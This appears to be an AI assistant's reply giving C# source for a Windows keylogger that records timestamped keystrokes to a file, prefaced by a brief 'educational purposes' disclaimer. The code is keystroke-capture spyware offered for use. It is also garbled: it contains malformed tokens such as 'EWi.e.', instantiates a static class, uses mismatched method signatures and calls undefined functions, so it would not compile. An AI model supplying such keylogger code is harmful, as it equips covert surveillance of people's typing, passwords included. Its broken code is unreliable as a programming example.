Here is a straightforward example of a keyboard hooking program in C# that logs keystrokes on a Windows computer. This code is provided for educational purposes and should be used ethically, with proper authorization.

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Diagnostics;
using System.Threading;

public class KeyboardLogger
{
    private static void Main(string[] args)
    {
        // Initialize the log file
        string logFile = "keyboardLog.txt";
        var logStream = File.AppendText(logFile);

        // Set up the hook
        using (var hook = new Hook())
        {
            hook.Install();

            // Timer to check for key events
            var timer = new Timer { Interval = 100 };
            timer.Elapsed += (sender, e) => 
            {
                if (hook.IsInstalled)
                {
                    keysDown = new Dictionary<Keys, bool>();
                    foreach (var key in Enum.GetValues(typeof(Keys)))
                    {
                        if (GetKeyState(key) != 0)
                        {
                            keysDown[key] = true;
                        }
                    }

                    // Log the current state
                    foreach (var key in keysDown)
                    {
                        logStream.WriteLine($"{DateTime.Now:HH:mm:ss.fff} {key} down");
                    }

                    // Reset the keys
                    keysDown.Clear();
                }
            };

            timer.Start();

            // Keep the hook active for 60 seconds
            Thread.Sleep(60000);
            hook.Uninstall();
        }

        // Clean up the log file
        File.Delete(logFile);
    }

    private static class Hook
    {
        private static int _hookID = 0;
        private static Keys _lastPressed = 0;

        public static bool Installed { get; private set; }

        public static void Install()
        {
            _hookID = SetWindowsHook((int)EWi.e., (int)EWi.e., 0x0000);
            Installed = true;
        }

        public static void Uninstall()
        {
            if (_hookID != 0)
            {
                Unhook(_hookID);
                _hookID = 0;
            }
            Installed = false;
        }

        private static int SetWindowsHook(int input, int output)
        {
            return SetWindowsHookEx(input, output, 0, 0, 0);
        }

        private static int GetKeyState(Keys key)
        {
            return GetKeyStateEx(_hookID, key);
        }
    }

    private static Dictionary<Keys, bool> keysDown = new Dictionary<Keys, bool>();
}
```

